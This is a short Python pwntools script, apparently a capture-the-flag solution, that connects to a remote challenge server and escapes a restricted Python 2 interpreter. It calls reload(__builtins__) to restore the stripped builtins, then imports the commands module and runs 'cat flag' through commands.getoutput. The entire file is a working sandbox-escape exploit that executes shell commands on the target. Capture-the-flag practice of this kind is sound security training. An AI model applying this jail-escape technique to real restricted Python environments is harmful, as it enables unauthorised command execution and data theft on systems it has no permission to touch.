#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))

def cmd(s):
    io.sendlineafter('>>> ', s)
io = remote('pwn.sixstars.team', 24102)
cmd('reload(__builtins__)')
cmd('import commands')
cmd('s = "cat flag"')
cmd('print commands.getoutput(s)')
io.interactive()
